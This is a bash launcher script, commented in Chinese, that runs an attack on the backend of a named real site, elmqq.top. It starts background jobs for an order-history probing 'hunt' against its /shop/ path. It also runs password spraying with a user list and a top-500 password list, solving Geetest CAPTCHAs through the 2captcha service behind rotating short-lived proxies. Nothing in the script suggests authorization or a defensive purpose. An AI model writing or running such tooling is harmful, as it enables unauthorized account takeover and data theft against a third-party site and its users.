#!/bin/bash
# elmqq.top 后台：登录喷洒 + showOrder 历史链搜索
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
OUT="${FAKA_OUT:-/data/tools/faka/out/elmqq}"
if [ ! -d "$(dirname "$OUT")" ]; then
  OUT="$ROOT/out/elmqq"
fi
mkdir -p "$OUT"

export PYTHONPATH="$ROOT:$ROOT/cookie:${PYTHONPATH:-}"
LOG="$OUT/run_elmqq_bg.log"

echo "[$(date -Iseconds)] elmqq bg start" | tee -a "$LOG"

# 青果短效（若存在）
if [ -f "$ROOT/qg_short_fetch.py" ]; then
  python3 "$ROOT/qg_short_fetch.py" --write-env 2>>"$LOG" || true
fi

# 1) showOrder 狩猎（先跑，不耗 2captcha）
nohup python3 "$ROOT/out/elmqq/showorder_hunt.py" --host elmqq.top --path /shop/ \
  >>"$OUT/showorder_hunt.log" 2>&1 &
echo $! >"$OUT/showorder_hunt.pid"
echo "showorder_hunt pid=$(cat "$OUT/showorder_hunt.pid")" | tee -a "$LOG"

# 2) 登录喷洒（Geetest + 2captcha，需 cookie/2captcha.env）
CAPTCHA_CFG=""
for f in "$ROOT/cookie/2captcha.env" "/data/tools/faka/cookie/2captcha.env"; do
  [ -f "$f" ] && CAPTCHA_CFG="$f" && break
done
if [ -n "$CAPTCHA_CFG" ] && grep -q 'TWOCAPTCHA_API_KEY=.\+' "$CAPTCHA_CFG" 2>/dev/null; then
  nohup python3 "$ROOT/out/elmqq/login_spray_bg.py" \
    --host elmqq.top --path /shop/ \
    --users "$ROOT/data/rainbow_users.txt" \
    --passwords "$ROOT/data/top500_passwords.txt" \
    --limit-pass 500 \
    >>"$OUT/login_spray_bg.log" 2>&1 &
  echo $! >"$OUT/login_spray.pid"
  echo "login_spray pid=$(cat "$OUT/login_spray.pid")" | tee -a "$LOG"
else
  echo "[!] 跳过 login_spray：未配置 2captcha ($ROOT/cookie/2captcha.env)" | tee -a "$LOG"
fi

echo "tail -f $OUT/login_spray_bg.log"
echo "tail -f $OUT/showorder_hunt.log"
